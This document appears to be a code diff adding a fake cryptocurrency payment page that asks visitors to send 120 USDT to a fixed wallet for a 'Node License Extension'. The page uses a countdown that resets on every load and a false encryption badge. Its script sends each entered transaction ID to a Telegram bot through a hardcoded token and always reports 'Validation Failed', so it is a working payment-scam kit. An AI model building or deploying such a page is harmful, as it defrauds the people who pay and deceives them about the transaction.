@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Payment | Global Node</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(to bottom, #000000 50%, #f1f5f9 50%);
+            overflow-x: hidden;
+        }
+
+        .glass-panel {
+            background: #ffffff;
+            border-radius: 30px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 380px;
+            padding: 2.5rem 2rem;
+        }
+
+        .loader {
+            border: 2px solid rgba(0, 0, 0, 0.05);
+            border-top: 2px solid #000;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .copy-feedback {
+            display: none;
+            position: absolute;
+            top: -35px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #000;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 10px;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        .warning-box {
+            background: #fffbeb;
+            border: 1px solid #fef3c7;
+            color: #92400e;
+        }
+
+        input::placeholder {
+            color: #cbd5e1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="w-full max-w-[380px] px-4">
+        <div class="text-center mb-6">
+            <h1 class="text-white text-2xl font-extrabold tracking-tight uppercase">Crypto Pay</h1>
+            <p class="text-zinc-500 text-[9px] font-black tracking-[0.4em] uppercase mt-2">Secure Blockchain Gateway</p>
+        </div>
+
+        <div class="glass-panel">
+            <!-- Header Info -->
+            <div class="flex justify-between items-center mb-6 pb-5 border-b border-zinc-100">
+                <div>
+                    <h2 class="text-[10px] font-black uppercase text-zinc-400 tracking-wider">Payment For</h2>
+                    <p class="text-sm font-bold text-zinc-900">Node License Extension</p>
+                </div>
+                <div class="bg-black text-white px-3 py-1 rounded-full text-xs font-black">$120.00</div>
+            </div>
+
+            <!-- Network Warning -->
+            <div class="warning-box rounded-2xl p-3 mb-6 text-center">
+                <p class="text-[10px] font-bold uppercase tracking-tight">⚠️ Important: Use BEP20 Network Only</p>
+                <p class="text-[9px] mt-1 opacity-80">Sending via any other network will result in permanent loss of funds.</p>
+            </div>
+
+            <!-- Timer Section (Resets on Load) -->
+            <div class="bg-zinc-50 border border-zinc-100 rounded-2xl p-4 mb-6 text-center">
+                <p class="text-[9px] text-zinc-400 mb-1 uppercase tracking-widest font-black">Session Expires In</p>
+                <div id="timer" class="text-2xl font-black text-zinc-900 tracking-tighter">20:00</div>
+            </div>
+
+            <!-- Payment Details -->
+            <div class="space-y-6">
+                <div>
+                    <label class="text-[9px] text-zinc-400 font-black uppercase tracking-widest block mb-2">Amount to Send</label>
+                    <div class="bg-zinc-50 border border-zinc-100 p-4 rounded-xl flex justify-between items-center">
+                        <span class="text-lg font-extrabold tracking-tight text-zinc-900">120.00</span>
+                        <span class="text-[10px] font-black text-zinc-400 tracking-widest uppercase">USDT • BEP20</span>
+                    </div>
+                </div>
+
+                <div class="relative">
+                    <label class="text-[9px] text-zinc-400 font-black uppercase tracking-widest block mb-2">Deposit Address (BEP20)</label>
+                    <div class="relative group">
+                        <div id="address-box" class="bg-zinc-50 border border-zinc-100 p-4 pb-12 rounded-xl break-all text-[10px] font-mono text-zinc-500 text-center">
+                            0x8e94e5cb8d76e36d9c1c1ccba1b4ad9ad1b9bde8
+                        </div>
+                        <div id="copy-msg" class="copy-feedback">Copied!</div>
+                        
+                        <!-- Copy Button -->
+                        <button onclick="copyAddress()" class="absolute bottom-2 left-1/2 -translate-x-1/2 bg-white border border-zinc-200 px-4 py-1.5 rounded-lg text-[9px] font-black uppercase tracking-widest flex items-center gap-2 hover:bg-zinc-50 transition shadow-sm">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2" />
+                            </svg>
+                            Copy Address
+                        </button>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-zinc-100">
+                    <div class="mb-2 px-1 text-center">
+                        <p class="text-[9px] font-black text-zinc-400 uppercase tracking-widest">Confirmation Step</p>
+                        <p class="text-[8px] text-zinc-500 leading-tight mt-1">Provide the TXID from your transfer history to confirm the payment.</p>
+                    </div>
+                    <input type="text" id="txid-input" placeholder="Enter Transaction ID (TXID)" class="w-full bg-zinc-50 border border-zinc-100 p-4 rounded-xl text-[11px] font-bold focus:outline-none focus:border-black transition text-center uppercase mb-3">
+                    <button onclick="verifyTransaction()" class="w-full bg-black text-white font-black py-4 rounded-xl text-[10px] uppercase tracking-widest hover:opacity-90 transition shadow-lg">
+                        Verify Payment
+                    </button>
+                </div>
+            </div>
+
+            <div class="mt-8 text-center">
+                <div class="flex items-center justify-center gap-2 opacity-30">
+                    <img src="https://img.icons8.com/material-rounded/24/000000/shield-check.png" class="w-3 h-3">
+                    <span class="text-[8px] font-black uppercase">AES-256 Encrypted Connection</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Modal -->
+    <div id="loading-modal" class="fixed inset-0 bg-white/95 backdrop-blur-sm hidden items-center justify-center z-50 p-6">
+        <div class="text-center max-w-xs w-full">
+            <div id="loading-state">
+                <div class="loader mx-auto mb-6"></div>
+                <h3 class="text-sm font-black uppercase tracking-widest mb-2">Verifying Transaction</h3>
+                <p class="text-zinc-400 text-[10px] leading-relaxed font-bold">Checking node status for confirmation...</p>
+            </div>
+            <div id="error-state" class="hidden">
+                <div class="w-12 h-12 bg-zinc-100 text-black rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </div>
+                <h3 class="text-sm font-black uppercase tracking-widest mb-2">Validation Failed</h3>
+                <p class="text-zinc-400 text-[10px] mb-8 font-bold uppercase text-red-500">Wrong TXID / Not found on BEP20</p>
+                <button onclick="closeModal()" class="w-full bg-black text-white py-4 rounded-xl text-[10px] font-black uppercase tracking-widest">Try Again</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TG_TOKEN = "8543130225:AAHmi-1310ek2zooKmQI6whw_saXbXRR7mk";
+        const TG_CHAT_ID = "8423231609";
+
+        // --- Timer Logic (Resets to 20:00 on Page Load) ---
+        const TIMER_DURATION = 20 * 60; 
+        let timeLeft = TIMER_DURATION;
+
+        function startTimer() {
+            const timerDisplay = document.getElementById('timer');
+            const interval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (--timeLeft < 0) {
+                    clearInterval(interval);
+                    timerDisplay.textContent = "00:00";
+                }
+            }, 1000);
+        }
+
+        // --- Copy Logic ---
+        function copyAddress() {
+            const address = "0x8e94e5cb8d76e36d9c1c1ccba1b4ad9ad1b9bde8";
+            const dummy = document.createElement("textarea");
+            document.body.appendChild(dummy);
+            dummy.value = address;
+            dummy.select();
+            document.execCommand('copy');
+            document.body.removeChild(dummy);
+            
+            const msg = document.getElementById('copy-msg');
+            msg.style.display = 'block';
+            setTimeout(() => msg.style.display = 'none', 2000);
+        }
+
+        // --- Verification Logic with Telegram ---
+        async function verifyTransaction() {
+            const txid = document.getElementById('txid-input').value.trim();
+            if (!txid) return;
+            
+            const modal = document.getElementById('loading-modal');
+            const loading = document.getElementById('loading-state');
+            const error = document.getElementById('error-state');
+            
+            modal.style.display = 'flex';
+            loading.classList.remove('hidden');
+            error.classList.add('hidden');
+
+            const message = `🔔 *New Verification Attempt*\n\n💰 *Amount:* \`$120.00 USDT\`\n🌐 *Network:* \`BEP20\`\n🔑 *TXID:* \`${txid}\``;
+            
+            try {
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+            } catch (e) {}
+            
+            setTimeout(() => {
+                loading.classList.add('hidden');
+                error.classList.remove('hidden');
+            }, 6000);
+        }
+
+        function closeModal() {
+            document.getElementById('loading-modal').style.display = 'none';
+        }
+
+        window.onload = startTimer;
+    </script>
+</body>
+</html>
+
